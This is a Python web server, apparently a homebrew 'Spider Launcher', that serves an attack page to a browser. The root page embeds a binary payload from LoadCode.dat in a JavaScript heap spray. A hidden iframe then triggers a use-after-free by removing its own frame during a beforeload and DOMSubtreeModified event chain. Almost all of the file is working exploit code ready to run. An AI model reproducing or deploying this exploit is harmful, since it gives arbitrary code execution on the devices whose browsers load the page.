
import functools
import itertools
import os
from time import time as now
try:
    from http.server import BaseHTTPRequestHandler
    iterbytes = iter

    def write_(obj, data):
        obj.write(bytes(data, 'utf-8'))
except ImportError:
    from BaseHTTPServer import BaseHTTPRequestHandler
    iterbytes = functools.partial(itertools.imap, ord)

    def write_(obj, data):
        obj.write(data)


DATA_DIR = os.path.join(os.path.dirname(__file__), '..', 'data')
LOAD_CODE_FNAME_START = 0x254


class SpiderLauncherServer(BaseHTTPRequestHandler):
    server_version = 'Spider Launcher/1.0'

    def do_GET(self):
        query = {}
        try:
            path, raw_query = self.path.split('?', 2)
            for raw_param in raw_query.split('&'):
                if '=' not in raw_param:
                    query[raw_param] = ''
                    continue
                name, value = raw_param.split('=')
                query[name] = value
        except:
            path = self.path
        print('GET', path, query)
        if not path:
            self.send_response(301)
            self.send_header('Location', '/')
            self.end_headers()
            return
        elif path == '/':
            with open(os.path.join(DATA_DIR, 'LoadCode.dat'), 'rb') as handle:
                data = handle.read()
            escaped_code = ''
            data = list(iterbytes(data))  # mutable
            if 'file' in query:
                if len(query['file']) > 32:
                    self.send_error(400, 'Invalid file specified')
                    return
                filename = query['file']
            else:
                filename = 'code.bin'
            ofs = LOAD_CODE_FNAME_START + len('dmc:/')*2
            for char in filename:
                data[ofs] = ord(char)
                ofs += 2
            data[ofs] = 0
            data[ofs+1] = 0
            self.send_response(200)
            self.send_header('Content-type', 'text/html')
            self.send_header('Last-Modified', self.date_time_string(now()))
            for char in data:
                escaped_code += '\\u{0:04x}'.format(char)
            response_text = '''<html>
<head>
<style>
    body {
        color:white;
        background:black;
        text-align: center;
    }
</style>
<script>
    function magicfun(mem, size, v) {
        var a = new Array(size - 20);
        nv = v + unescape("%%ucccc");
        for (var j = 0; j < a.length / (v.length / 4); j++) a[j] = nv;
        var t = document.createTextNode(String.fromCharCode.apply(null, new Array(a)));

        mem.push(t);
    }

    function dsm(evnt) {
        var mem = [];

        for (var j = 20; j < 430; j++) {
            magicfun(mem, j, unescape("%s"));
        }
    }
</script>
</head>
<body>
        <h1 align="center">Spider Launcher running...</h1>
        <p>target = %s</p>
        <iframe width=0 height=0 src="frame.html"></iframe>
</body>
</html>''' % (escaped_code, filename)
            self.send_header('Content-Length', len(response_text))
            self.end_headers()
            write_(self.wfile, response_text)
            return
        elif path == '/frame.html':
            self.send_response(200)
            self.send_header('Content-type', 'text/html')
            self.send_header('Last-Modified', self.date_time_string(now()))
            response_text = '''<html>
    <head>
        <script>
            var nb = 0;
            function handleBeforeLoad() {
                if (++nb == 1) {
                    p.addEventListener('DOMSubtreeModified', parent.dsm, false);
                } else if (nb == 2) {
                    p.removeChild(f);
                }
            }

            function documentLoaded() {
                f = window.frameElement;
                p = f.parentNode;
                var o = document.createElement("object");
                o.addEventListener('beforeload', handleBeforeLoad, false);
                document.body.appendChild(o);
            }

            window.onload = documentLoaded;
        </script>
    </head>
    <body>
        AAAAAAAAA...
    </body>
</html>'''
            self.send_header('Content-Length', len(response_text))
            self.end_headers()
            write_(self.wfile, response_text)
            return
        self.send_error(404, "File not found")
        return 'hello world'
